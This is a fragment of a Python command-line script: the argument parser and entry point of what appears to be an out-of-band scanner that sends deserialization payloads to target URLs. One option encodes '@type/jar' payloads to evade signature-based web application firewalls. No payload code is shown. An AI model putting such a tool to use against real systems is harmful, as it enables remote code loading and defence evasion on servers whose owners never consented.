                        "e.g. http://203.0.113.10:50050 (env OOB_URL)")
    p.add_argument("-t", "--target", action="append", default=[],
                   help="full target URL to test, incl. path (repeatable)")
    p.add_argument("-f", "--file", help="FILE with one target URL per line")
    p.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
                   help="extra request header, curl-style (repeatable)")
    p.add_argument("-x", "--proxy",
                   help="route target requests through a PROXY (http/https, e.g. http://127.0.0.1:8080)")
    p.add_argument("--ghost", action="store_true",
                   help="Ghost-Bits: \\u-encode @type/jar with fullwidth digits to evade signature WAFs")
    p.add_argument("--entry", default="POC", help="jar entry base NAME (cosmetic; not sent over HTTP)")
    p.add_argument("--timeout", type=parse_duration, default="8s", metavar="DURATION",
                   help="per-request HTTP timeout (default 8s)")
    p.add_argument("--wait", type=parse_duration, default="10s", metavar="DURATION",
                   help="how long to poll for OOB callbacks after sending (default 10s)")
    p.add_argument("--interval", type=parse_duration, default="2s", metavar="DURATION",
                   help="poll interval (default 2s)")
    p.add_argument("-v", "--verbose", action="store_true", help="print each payload and poll errors")
    p.set_defaults(func=cmd_scan)

    return parser


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
